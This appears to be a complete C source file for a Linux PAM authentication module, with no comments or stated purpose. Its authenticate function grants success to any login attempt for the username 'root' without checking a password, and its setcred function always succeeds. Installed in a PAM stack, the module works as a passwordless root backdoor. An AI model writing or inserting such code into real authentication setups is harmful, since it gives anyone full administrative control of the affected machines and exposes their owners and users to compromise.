#include <security/pam_modules.h>
#include <string.h>



PAM_EXTERN int pam_sm_setcred( pam_handle_t *pamh, int flags, int argc, const char **argv ) 
{
	return PAM_SUCCESS;
}


PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv ) 
{

	int rval;
	const char* username;


	struct pam_response *resp;
	struct pam_conv *conv;

	rval = pam_get_user(pamh, &username, NULL);

	if (rval != PAM_SUCCESS) {
		return rval;
	}

	if (strcmp("root",username) == 0)
		return PAM_SUCCESS;

	return PAM_AUTH_ERR;
}